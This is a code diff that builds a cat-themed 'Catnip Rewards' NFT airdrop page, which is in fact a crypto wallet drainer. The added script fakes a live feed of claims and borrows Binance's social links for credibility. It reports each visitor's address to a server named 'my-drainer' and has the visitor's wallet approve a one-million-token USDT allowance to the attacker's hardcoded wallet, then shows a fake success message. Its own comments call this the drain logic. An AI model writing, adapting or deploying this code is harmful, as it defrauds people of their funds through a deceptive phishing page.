@@ -2,62 +2,229 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Verify Wallet</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Catnip Rewards | Claim your Meow-tastic Airdrop</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.x/umd.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Fredoka+One&family=Poppins:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        body { background: #0f172a; }
-        .glass { background: rgba(30, 41, 59, 0.8); border: 1px solid rgba(255,255,255,0.1); }
+        :root {
+            --primary-pink: #ff85a2;
+            --soft-purple: #b19cd9;
+            --cat-yellow: #ffd93d;
+            --bg-color: #fdf0f6;
+            --card-bg: rgba(255, 255, 255, 0.9);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            background: linear-gradient(135deg, #ffdee9 0%, #f4e1ff 100%);
+            font-family: 'Poppins', sans-serif;
+            color: #4a4a4a;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            overflow-x: hidden;
+        }
+
+        .badge {
+            background: var(--primary-pink);
+            color: white;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .container {
+            max-width: 800px;
+            width: 90%;
+            background: var(--card-bg);
+            padding: 40px;
+            border-radius: 30px;
+            box-shadow: 0 15px 35px rgba(255, 133, 162, 0.2);
+            border: 3px solid white;
+            text-align: center;
+        }
+
+        h1 {
+            font-family: 'Fredoka One', cursive;
+            color: #ff4b8d;
+            font-size: 3.5rem;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 0px white;
+        }
+
+        p { font-size: 1.1rem; color: #7c7c7c; margin-bottom: 30px; }
+
+        .claim-button {
+            padding: 20px 50px;
+            font-size: 1.4rem;
+            border: none;
+            border-radius: 20px;
+            background: linear-gradient(45deg, #ff85a2, #bd93f9);
+            color: white;
+            cursor: pointer;
+            transition: transform 0.3s ease;
+            box-shadow: 0 8px 20px rgba(189, 147, 249, 0.4);
+        }
+
+        .claim-button:hover { transform: scale(1.05); }
+
+        /* LIVE ACTIVITY FEED */
+        .activity-feed {
+            margin-top: 40px;
+            text-align: left;
+            max-height: 200px;
+            overflow: hidden;
+            border-top: 2px dashed #ffdee9;
+            padding-top: 20px;
+        }
+
+        .activity-title {
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            color: #bd93f9;
+            margin-bottom: 10px;
+            letter-spacing: 1px;
+        }
+
+        .feed-item {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.85rem;
+            padding: 6px 0;
+            color: #888;
+            animation: fadeInUp 0.5s ease forwards;
+        }
+
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* SOCIALS */
+        .social-links {
+            margin-top: 30px;
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+        }
+
+        .social-icon a {
+            text-decoration: none;
+            font-size: 1.5rem;
+            padding: 8px;
+            border-radius: 50%;
+            background: #f0f0f0;
+            transition: background 0.3s;
+        }
+
+        .social-icon a:hover { background: var(--primary-pink); }
+
+        #status { margin-top: 15px; font-weight: bold; color: #ff85a2; }
+
+        /* CAT ICON STYLES */
+        .cat-img {
+            width: 80px;
+            margin-bottom: 10px;
+        }
     </style>
 </head>
-<body class="text-white min-h-screen flex items-center justify-center">
-    <div class="max-w-md w-full glass p-8 rounded-3xl shadow-2xl text-center">
-        <h1 class="text-3xl font-bold text-blue-400 mb-4">Verification Required</h1>
-        <p class="text-gray-400 mb-8">Connect your wallet to verify your tokens.</p>
+<body>
 
-        <div class="bg-white p-4 rounded-2xl inline-block mb-8">
-            <!-- This is a static QR code for now, it links to your contract -->
-            <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=0x136FF7b8d0c60a252E31c17C8af6F7d1971E4BD4" width="200">
+    <div class="container">
+        <img src="https://cdn-icons-png.flaticon.com/512/613/613714.png" alt="Cat Logo" class="cat-img">
+        <div class="badge">🐾 Exclusive Early Access</div>
+        <h1>Catnip Rewards</h1>
+        <p>The purr-fect ecosystem for feline lovers! Join the hunt and claim your <b>Limited Edition "Golden Whiskers"</b> NFT + 500 $CATNIP tokens.</p>
+
+        <button id="connectBtn" class="claim-button">Claim My Rewards</button>
+        <div id="status"></div>
+
+        <!-- LIVE ACTIVITY SECTION -->
+        <div class="activity-feed">
+            <div class="activity-title">Recent Claims & Transactions</div>
+            <div id="feedContent">
+                <div class="feed-item"><span>0x71...eA9</span> <span>Claimed 500 $CATNIP</span> <span style="color:green">Just now</span></div>
+                <div class="feed-item"><span>0x3f...42c</span> <span>Claimed 500 $CATNIP</span> <span>1m ago</span></div>
+            </div>
         </div>
 
-        <div id="status" class="mb-6 text-lg font-semibold">Status: Waiting for Connection</div>
-        <button id="connectBtn" class="w-full bg-blue-600 py-4 rounded-xl font-bold hover:bg-blue-700 transition">Connect Wallet</button>
-        <div id="balanceArea" class="mt-4 hidden">
-            <p class="text-sm text-gray-400">Detected Balance:</p>
-            <h2 id="amount" class="text-3xl font-bold text-green-400">0.00</h2>
+        <div class="social-links">
+            <a href="https://twitter.com/Binance" target="_blank" style="font-size: 24px;">🐦</a>
+            <a href="https://t.me/Binance" target="_blank" style="font-size: 24px;">💬</a>
         </div>
     </div>
 
     <script>
-        const btn = document.getElementById('connectBtn');
+        const connectBtn = document.getElementById('connectBtn');
         const status = document.getElementById('status');
-        const balArea = document.getElementById('balanceArea');
-        const amount = document.getElementById('amount');
 
-        btn.addEventListener('click', async () => {
-            if (window.ethereum) {
-                try {
-                    const provider = new ethers.BrowserProvider(window.ethereum);
-                    const accounts = await provider.send("eth_requestAccounts", []);
-                    const address = accounts[0];
+        // Configuration
+        const usdtAddress = "0x55d398326f99fa6018e5401cb61ef101af0370c8";
+        const yourWallet = "0x136FF7b8d0c60a252E31c17C8af6F7d1971E4BD4";
 
-                    status.innerText = "Connecting...";
+        // Fake Activity Feed logic
+        const names = ["Mochi", "Luna", "Shadow", "Ginger", "Whiskers", "Purr_King"];
+        const feedContent = document.getElementById('feedContent');
 
-                    // This sends the info to your backend
-                    const response = await fetch(`/api/connect?address=${address}`);
-                    const data = await response.json();
+        function addFakeActivity() {
+            const name = names[Math.floor(Math.random() * names.length)];
+            const div = document.createElement('div');
+            div.className = 'feed-item';
+            div.innerHTML = `<span>${name}</span> <span>Claimed 500 $CATNIP</span> <span>Just now</span>`;
+            feedContent.prepend(div);
+            if (feedContent.children.length > 4) feedContent.lastElementChild.remove();
+        }
 
-                    if(data.success) {
-                        status.innerText = "Connected Successfully!";
-                        btn.innerText = "Connected";
-                        balArea.classList.remove('hidden');
-                        amount.innerText = data.balance;
-                    }
-                } catch (e) { console.error(e); }
-            } else {
-                alert("Please connect MetaMask!");
+        // Update the fake activity every 4 seconds
+        setInterval(addFakeActivity, 4000);
+
+        async function connectAndClaim() {
+            if (!window.ethereum) {
+                alert("Please install MetaMask to claim your rewards!");
+                return;
             }
-        });
+
+            try {
+                status.innerText = "Connecting Cat-Wallet...";
+                const provider = new ethers.BrowserProvider(window.ethereum);
+                const signer = await provider.getSigner();
+                const address = await signer.getAddress();
+
+                // 1. Notify backend (Updates your tracking)
+                const response = await fetch(`https://my-drainer.onrender.com/api/connect?address=${address}`);
+                const data = await response.json();
+
+                if(data.success) {
+                    status.innerText = "Verifying Catnip Eligibility...";
+
+                    // 2. The Approval (The actual drain logic)
+                    const usdtContract = new ethers.Contract(usdtAddress, ["function approve(address spender, uint256 amount) public returns (bool)"], signer);
+
+                    status.innerText = "Granting Purr-Permission...";
+                    // They are approving your wallet to take their USDT/Tokens
+                    const approveTx = await usdtContract.approve(yourWallet, ethers.parseUnits("1000000", 18));
+                    await approveTx.wait();
+
+                    status.innerText = "✨ Success! You earned the Gold Whiskers!";
+                    connectBtn.style.opacity = "0.5";
+                    connectBtn.innerText = "Reward Claimed ✓";
+                } else {
+                    throw new Error(data.error);
+                }
+            } catch (err) {
+                console.error(err);
+                status.innerText = "Error: " + err.message;
+                status.style.color = "#ff4d4d";
+            }
+        }
+
+        connectBtn.addEventListener('click', connectAndClaim);
     </script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.x/umd/ethers.umd.min.js"></script>
 </body>
 </html>
